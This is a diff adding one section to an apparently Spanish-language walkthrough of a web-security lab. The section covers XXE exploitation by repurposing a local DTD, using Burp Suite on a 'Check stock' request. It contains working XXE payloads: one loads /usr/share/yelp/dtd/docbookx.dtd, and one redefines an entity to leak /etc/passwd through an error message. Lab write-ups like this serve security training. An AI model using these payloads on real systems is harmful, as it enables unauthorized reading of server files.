@@ -219,3 +219,37 @@ Entonces, como podemos ver, hemos obtenido el contenido del fichero **/etc/passw
 
 ## 7. Lab: Exploiting XXE to retrieve data by repurposing a local DTD
 
+```
+Este laboratorio tiene una función "Check Stock" que analiza la entrada XML pero no muestra el resultado.
+
+Para resolver el laboratorio, active un mensaje de error que contenga el contenido del archivo /etc/passwd.
+
+Deberá hacer referencia a un archivo DTD existente en el servidor y redefinir una entidad a partir de él.
+```
+
+Entonces, vamos al laboratorio e interceptamos en segundo plano todos los paquetes en el burpsuite, entonces vamos a un producto y hacemos clic en **Check stock** y buscamos el paquete en el **Http history** y lo enviamos al **Repeater**.
+
+![](img23.png)
+
+Primero importaremos una **DTD** local, para ver que funcione todo bien agregando el siguiente payload,
+
+```
+<!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">%local_dtd;]>
+```
+
+![](img24.png)
+
+Entonces podemos ver que no genera ningun error, entonces el **DTD** es válido. Ahora intentaremos recuperar el contenido del fichero **/etc/passwd** usando el siguiente payload.
+
+```
+<!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"><!ENTITY % ISOtech '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">&#x25;eval;&#x25;error;'>%local_dtd;]>
+```
+
+![](img25.png)
+
+Entonces, como podemos ver, hemos obtenido el contenido del fichero **/etc/passwd** a travéz de un mensaje de error. Ahora, vamos al home para verificar que completamos el laboratorio.
+
+![](img26.png)
+
+## 8. Lab: Exploiting XInclude to retrieve files
+
